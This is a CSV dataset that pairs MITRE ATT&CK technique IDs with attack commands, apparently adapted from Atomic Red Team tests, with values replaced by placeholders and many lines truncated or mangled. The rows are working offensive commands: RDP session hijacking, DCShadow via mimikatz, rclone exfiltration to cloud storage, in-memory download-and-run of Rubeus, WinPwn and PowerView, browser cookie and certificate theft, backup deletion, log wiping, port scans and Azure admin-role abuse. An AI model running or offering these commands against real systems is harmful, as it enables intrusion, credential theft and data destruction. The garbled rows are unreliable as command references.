mitre_id,command
T1563,"query  user  sc.exe  create  sesshijack  binpath=  ""cmd.exe  \k  tscon  var_267""  net  start  sesshijack"
T1207,"#  starting  fake  dc  server,  as  system  (required)  $dc_output_file  =  ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log""  remove-item  $dc_output_file  -erroraction  ignore  $mimikatzparam  =""`""log  $dc_output_file`""  `""lsadump::dcshadow  \object:var_603""  ""lsadump::dcshadow  \push""  ""exit""  write-host  ""`nwaiting  for  fake  dc  server  to  return""  wait-process  $dc  write-host  ""`noutput  from  fake  dc  server:""  get-content  $dc_output_file  start-sleep  1  #  wait  a  little  until  the  file  is  not  locked  anymore  so  we  can  actually  delete  it  remove-item  $dc_output_file  -erroraction  ignore  write-host  ""end  of  dcshadow"""
T1567,"write-host ""deploying aws infrastructure... "" -nonewline $awsaccesskey = ""var_286 ""@ $config | out-file -filepath ""pathtoatomicsfolder\..\externalpayloads\t1567.002\rclone.conf"" -encoding ascii write-host ""done!"" write-host ""exfiltrating data... "" -nonewline $bucket = ""$(pathtoatomicsfolder\..\externalpayloads\t1567.002\terraform-v*\terraform output bucket)"".replace(""`"""","""") cd pathtoatomicsfolder\..\externalpayloads\t1567.002\rclone-v* $null = .\rclone copy --max-size 1700k ""pathtoatomicsfolder\..\externalpayloads\t1567.002\data\"" exfils3:$bucket --config ""pathtoatomicsfolder\..\externalpayloads\t1567.002\rclone.conf"" write-host ""done!"""
T1025,"powershell.exe  -c  ""get-volume  |  where-object  {$_.drivetype  -eq  'removable'}  |  foreach-object  {  get-childitem  -path  ($_.driveletter  +  ':\*')  -recurse  -include  '*.doc*','*.xls*','*.txt','*.pdf'  -erroraction  silentlycontinue  |  foreach-object  {write-output  $_.fullname}  }  ;  if  (-not  (get-volume  |  where-object  {$_.drivetype  -eq  'removable'}))  {  write-output  'no  removable  media.'  }""# run_7388"
T1564,reg add hklm\software\microsoft\windows\currentversion\explorer\advanced /v showsuperhidden /t reg_dword /d 0 /f reg add hklm\software\microsoft\windows\currentversion\explorer\advanced /v hidden /t reg_dword /d 0 /f
T1083,"cd $home && find . -print | sed -e 's;[^\]*\;|__;g;s;__|; |;g' > var_24337 find . -type f -name "".*"""
T1556,"sudo sed -i """" ""var_372"
T1550,"""var_419"""
T1484,"import-module azuread import-module aadinternals $pword = convertto-securestring -string ""var_23997 write-host ""end of federation configuration."""
T1531,dscl  .  -delete  \users\var_593  #enter  admin  password
T1074,"compress-archive -path ""var_65562 -force"
T1553,xattr -d com.apple.quarantine #{app_path}
T1046,for port in {1..57821}; do (2>\dev\null echo >\dev\tcp\var_69073\$port) && echo port $port is open ; done
T1133,"$extlist = var_782 start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1135,"import-module ""pathtoatomicsfolder\..\externalpayloads\powerview.ps1"" invoke-sharefinder var_608"
T1137,"copy ""pathtoatomicsfolder\t1137.006\bin\addins\pptvbaaddin.ppam"" ""$env:appdata\microsoft\addins\notepad.ppam"" $ver = (new-object -comobject ""powerpoint.application"").version $excelregpath=""hkcu:\software\microsoft\office\$ver\powerpoint\addins\notepad"" new-item -type directory $excelregpath -force | out-null new-itemproperty $excelregpath ""autoload"" -value ""1"" -propertytype dword | out-null new-itemproperty $excelregpath ""path"" -value ""notepad.ppam"" -propertytype string | out-null stop-process -name ""powerpnt"" -erroraction ignore start-process ""powerpnt""# run_4905"
T1021,"echo """" | ""var_785"" ""vim-cmd hostsvc\enable_ssh"""
T1497,"if [ ""$(csrutil status | grep -v 'enabled')"" != """" ]; then echo 'possible virtualization environment detected'; fi;"
T1615,"powershell  -nop  -exec  bypass  -c  ""iex  (new-object  net.webclient).downloadstring('https:\\github.com\bc-security\empire\blob\86921fbbf4945441e2f9d9e7712c5a6e96eed0f3\empire\server\data\module_source\situational_awareness\network\powerview.ps1');  get-domaingpo""> /dev/null 2>&1 # id_75"
T1564,net user var_889$ \t reg_dword \d 0
T1489,sc.exe stop var_373
T1595,"import-module  ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1""  invoke-wordlistscan  -target  ""var_53087"""
T1613,docker  build  -t  t1613  $pathtoatomicsfolder\t1613\src\  docker  run  --name  t1613_container  --rm  -d  -t  t1613  docker  ps  docker  stats  --no-stream  docker  inspect  $(docker  ps  -l  -q  --filter  ancestor=t1613)# run_7222
T1049,$syntaxlist = var_7713
T1529,"echo ""b"" > /proc/sysrq-trigger# run_7505"
T1613,docker  build  -t  t1613  $pathtoatomicsfolder\t1613\src\  docker  run  --name  t1613_container  --rm  -d  -t  t1613  docker  ps  docker  stats  --no-stream  docker  inspect  $(docker  ps  -l  -q  --filter  ancestor=t1613)# run_6718
T1090,export var_401
T1123,sh var_35079
T1091,"$removabledrives=@()  $removabledrives  =  get-wmiobject  -class  win32_logicaldisk  -filter  ""drivetype=2""  |  select-object  -expandproperty  deviceid  foreach  ($drive  in  $removabledrives)  {  write-host  ""removable  drive  found:""  $drive  new-item  -path  $drive\t1091test1.txt  -itemtype  ""file""  -force  -value  ""t1091  test  1  has  created  this  file  to  simulate  malware  spread  to  removable  drives.""  }# run_7018"
T1539,"stop-process -name ""firefox"" -force -erroraction silentlycontinue $cookiedblocation = get-childitem -path ""$env:appdata\mozilla\firefox\profiles\*\cookies.sqlite"" ""select host, name, value, path, expiry, issecure, ishttponly, samesite from [moz_cookies];"" | cmd \c var_182"""
T1651,"import-module ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1"" -force $access_key = ""var_153"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1112,"reg add ""hklm\system\currentcontrolset\control\terminal server"" /v fdenytsconnections /t reg_dword /d 1 /f"
T1558,"iex(new-object  net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\powersharppack\master\powersharpbinaries\invoke-rubeus.ps1')  invoke-rubeus  -command  ""kerberoast  \format:hashcat  \nowrap"""
T1115,apt install xclip -y history | tail -n 30 | xclip -sel clip xclip -o > history.txt# run_3100
T1204,"invoke-webrequest -outfile $env:temp\test10.lnk ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/bin/test10.lnk"" $file1 = ""$env:temp\test10.lnk"" start-process $file1 start-sleep -s 10 taskkill /im a.exe /f"
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""var_300 write-host ""end of golden saml"""
T1187,"& ""#{petitpotam_path}"" #{captureserverip} #{targetserverip} #{efsapi} write-host ""end of petitpotam attack"""
T1482,"import-module  ""pathtoatomicsfolder\..\externalpayloads\powerview.ps1""  get-netdomaintrust  get-netforesttrust  get-addomain  get-adgroupmember  administrators  -recursive  ([system.directoryservices.activedirectory.domain]::getcurrentdomain()).getalltrustrelationships()# run_2911"
T1137,"$excelapp  =  new-object  -comobject  ""excel.application""  if(-not  $excelapp.path.contains(""program  files  (x86)"")){  write-host  ""64-bit  office""  $excelapp.registerxll(""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x64.xll"")  }  else{  write-host  ""32-bit  office""  $excelapp.registerxll(""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x86.xll"")  }> /dev/null 2>&1 # id_29"
T1219,"start-process ""var_590"""
T1027,"if [ ""$(uname)"" = 'freebsd' ]; then cmd=""b64decode -r""; else cmd=""base64 -d""; fi; cat \tmp\encoded.dat | $cmd > \tmp\art.sh chmod +x \tmp\art.sh \tmp\art.sh"
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive)# run_4338"
T1220,"wmic var_562"""
T1564,"if (!(test-path c:\users\public\libraries\yanki -pathtype container)) { new-item -itemtype directory -force -path c:\users\public\libraries\yanki } start-process -filepath ""$env:comspec"" -argumentlist ""/c,type,#{payload_path},>,`""#{ads_file_path}:#{ads_name}`"""""
T1567,new-item var_467:test -v
T1078,cat /etc/passwd |grep nobody pw usermod nobody -s /bin/sh echo $(openssl passwd -1 art) | pw mod user nobody -h 0 su nobody whoami exit# run_5786
T1087,"& ""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" var_174 -s subtree -f ""objectclass=computer"" *"
T1007,launchctl list# run_1757
T1082,$s3cur3th1ssh1t_repo = 'https://raw.githubusercontent.com/s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') winpeas -noninteractive -consoleoutput
T1037,"echo ""var_60864"" \f"
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }""; echo 64 > $null"
T1570,net use * 'var_453' '*:\'
T1555,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') kittenz -consoleoutput -noninteractive
T1195,"kubectl  run  var_93035  --no-audit  --no-fund  --no-package-lock  &&  echo  '---  package.json  after  install  ---'  &&  cat  package.json"""
T1030,$file  =  [system.io.file]::openread(var_607  $file.close()
T1047,wmic process call create var_61551
T1560,"mkdir .\tmp\victim-files cd .\tmp\victim-files echo ""this file will be encrypted"" > .\encrypted_file.txt ""#{rar_exe}"" a -hp""blue"" hello.rar dir"
T1046,for port in {1..65535}; do (2>\dev\null echo >\dev\tcp\var_893\$port) && echo port $port is open ; done
T1056,"&""$pathtoatomicsfolder\t1056.001\src\get-keystrokes.ps1"" -logpath var_983"
T1090,networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port} networksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}> /dev/null 2>&1 # id_41
T1053,kubectl create -f src/cronjob.yaml -n #{namespace}
T1047,powershell -exec bypass -e sqbuahyabwbragualqbxag0aaqbnaguadaboag8azaagac0auabhahqaaaagahcaaqbuadmamgbfahaacgbvagmazqbzahmaiaatae4ayqbtaguaiabjahiazqbhahqazqagac0aqqbyagcadqbtaguabgb0aewaaqbzahqaiabuag8adablahaayqbkac4azqb4agua
T1074,"compress-archive -path ""var_446 -force"
T1006,"$buffer  =  new-object  byte[]  11  $handle  =  new-object  io.filestream  ""\\.\var_554"",  'open',  'read',  'readwrite'  $handle.read($buffer,  0,  $buffer.length)  $handle.close()  format-hex  -inputobject  $buffer"
T1137,"reg add ""hkey_current_user\software\microsoft\office\16.0\outlook\security"" /v level /t reg_dword /d 1 /f mkdir %appdata%\microsoft\outlook\ >nul 2>&1 echo ""atomic red team test"" > %appdata%\microsoft\outlook\vbaproject.otm> /dev/null 2>&1 # id_39"
T1070,"new-item -path ""c:\users\$env:username\appdata\local\comms\unistore\data\copy"" -itemtype directory -erroraction ignore get-childitem -path ""c:\users\$env:username\appdata\local\comms\unistore\data"" -exclude copy | foreach-object { copy-item -path $_.fullname -destination ""c:\users\$env:username\appdata\local\comms\unistore\data\copy"" -recurse -force -erroraction ignore } remove-item -path ""c:\users\$env:username\appdata\local\comms\unistore\data\copy"" -recurse -force -erroraction ignore"
T1018,"""#{venv_path}\scripts\adidnsdump"" -u #{user_name} -p #{acct_pass} --print-zones #{host_name}# run_8569"
T1204,"set-itemproperty -path ""hkcu:\software\microsoft\windows\currentversion\explorer\runmru"" -name ""atomictest"" -value '""c:\windows\system32\mshta.exe"" http://localhost/hello6.hta'"
T1550,"& ""pathtoatomicsfolder\..\externalpayloads\psexec.exe"" -accepteula \\#{target} -w c:\ -c ""pathtoatomicsfolder\..\externalpayloads\rubeus.exe"" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi set-location ""pathtoatomicsfolder\..\externalpayloads"" move-item -force ""\\#{target}\c$\ticket.kirbi"" ticket.kirbi write-host ""successfully retrieved tgt from '#{target}', now requesting a tgs from local"" & ""pathtoatomicsfolder\..\externalpayloads\rubeus.exe"" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt remove-item ""pathtoatomicsfolder\..\externalpayloads\ticket.kirbi"" & ""pathtoatomicsfolder\..\externalpayloads\rubeus.exe"" purge"
T1098,"import-module exchangeonlinemanagement $secure_pwd = ""var_69396"" -accessrights fullaccess -inheritancetype all disconnect-exchangeonline -confirm:$false"
T1202,"conhost.exe ""var_673"""
T1570,new-smbmapping  -remotepath  'var_471'  'z:\'
T1083,"cd  $home  &&  find  .  -print  |  sed  -e  's;[^\]*\;|__;g;s;__|;  |;g'  >  var_35947  find  .  -type  f  -name  "".*"""
T1649,"$archive=""$env:public\t1649\atomic_certs.zip""  $exfilpath=""$env:public\t1649\certs""  add-type  -assembly  ""system.io.compression.filesystem""  remove-item  $(split-path  $exfilpath)  -recurse  -force  -erroraction  ignore  mkdir  $exfilpath  |  out-null  foreach  ($cert  in  (gci  cert:\currentuser\my))  {  export-certificate  -cert  $cert  -filepath  $exfilpath\$($cert.friendlyname).cer}  [io.compression.zipfile]::createfromdirectory($exfilpath,  $archive)# run_6832"
T1553,xattr -d com.apple.quarantine var_691
T1037,sudo cp var_560 \tmp\t1037_005_agent.plist \library\startupitems\atomic.sh start
T1018,for \l %i in (var_850.%i
T1573,$server_ip = var_537
T1069,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" -f (objectcategory=group) var_70561"
T1072,"""%programfiles(x86)%\var_90057"""
T1018,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" -f (objectcategory=computer) var_39519"
T1134,"start-process  ""var_839""  -argument  ""-u:t  -p:e  cmd""  start-sleep  -second  5  stop-process  -name  ""cmd""  -force  -erroraction  silentlycontinue"
T1074,"invoke-webrequest ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1074.001\src\discovery.bat"" -outfile var_273"
T1619,"import-module ""pathtoatomicsfolder\..\externalpayloads\invoke-enumerateazureblobs.ps1"" invoke-enumerateazureblobs -base var_673"""
T1176,"#  chromium  $chromium  =  ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip""  #  ublock  origin  lite  to  test  side-loading  $extension  =  ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.1376\ubolite_2024.11.25.1376.chromium.mv3.zip""  set-location  ""var_292\extension\""  -passthru"
T1654,powershell -c {get-eventlog 'security' | where {$_.message -like '*system*'} | export-csv $env:temp\t1654_events.txt}# run_4739
T1105,"nscurl -k ""#{remote_file}"" -o ""#{destination_path}""# run_6094"
T1197,start-bitstransfer -priority foreground -source #{remote_file} -destination #{local_file}
T1490,wbadmin delete systemstatebackup -keepversions:0# run_4770
T1619,"import-module ""pathtoatomicsfolder\..\externalpayloads\invoke-enumerateazureblobs.ps1"" invoke-enumerateazureblobs -base var_94466"""
T1485,"if  (-not  (test-path  ""var_31537"""
T1539,"stop-process -name ""chrome"" -force -erroraction silentlycontinue ""select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [cookies];"" | cmd \c var_707"""
T1572,nohup var_813 >\dev\null 2>&1 &
T1222,"reg  add  ""hklm\system\currentcontrolset\control\filesystem""  \v  symlinkremotetolocalevaluation  \t  reg_dword  \d  ""1""  \f  reg  add  ""hklm\system\currentcontrolset\control\filesystem""  \v  symlinkremotetoremoteevaluation  \t  reg_dword  \d  ""1""  \f"
T1041,"$dnsserver = ""var_753"
T1040,sudo #{program_path} -4 -p -p 17 -t 3
T1039,"copy-item -path ""\\var_473"""
T1070,truncate -s0 #{history_path}# run_5460
T1482,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" #{optional_args} -gcb -sc trustdmp"
T1041,"$dnsserver  =  ""var_277"
T1047,wmic \user:var_84957
T1610,docker build -t t1610 $pathtoatomicsfolder\t1610\src\ docker run --name t1610_container --rm -itd t1610 bash \tmp\script.sh> /dev/null 2>&1 # id_46
T1497,"if  [  ""$(sysctl  -n  hw.hv_vendor)""  !=  """"  ];  then  echo  ""virtualization  environment  detected"";  fi# run_6530"
T1098,"import-module msonline $password = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $password connect-msolservice -credential $credential add-msolrolemember -rolename ""company administrator"" -rolememberemailaddress ""#{target_user}"""
